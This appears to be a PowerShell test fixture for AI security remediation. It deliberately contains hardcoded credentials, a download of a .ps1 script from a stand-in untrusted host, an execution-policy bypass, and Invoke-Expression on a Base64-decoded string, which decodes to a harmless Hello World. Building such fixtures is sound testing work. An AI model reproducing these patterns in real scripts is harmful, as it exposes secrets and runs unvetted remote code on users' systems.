# Test script with multiple security issues
# Good for testing AI remediation with multiple fixes

# Hardcoded credentials
$password = "SuperSecret123!"
$token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"

# Network download without security
Invoke-WebRequest -Uri "https://untrusted-source.com/download.ps1" -OutFile "script.ps1"

# Execution policy bypass
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Base64 encoded content
$encoded = "V3JpdGUtSG9zdCAiSGVsbG8gV29ybGQi"
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))

# Execute without validation
Invoke-Expression $decoded

Write-Host "Script executed"

